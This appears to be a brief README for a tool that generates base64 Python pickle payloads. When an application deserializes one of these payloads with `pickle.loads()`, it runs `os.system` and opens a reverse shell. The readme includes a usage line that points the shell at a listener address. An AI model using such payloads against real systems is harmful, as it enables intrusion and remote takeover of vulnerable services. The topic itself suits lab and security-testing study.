# Pickle-RCE-Reverse-Shell-Generator
Pickle RCE base64 payload generator for exploiting unsafe Python deserialization (reverse shell via os.system)

## How it work
The tool creates a malicious pickle object that uses `__reduce__` to execute `os.system` with a reverse shell command during deserialization

## Usage
python3 pickle_rs_base64.py -LHOST -LPORT
Outputs a base64-encoded payload ready for use against vulnerable `pickle.loads()` calls

## Example
python3 pickle_rs_base64.py LHOST 10.10.14.5 -LPORT 4444

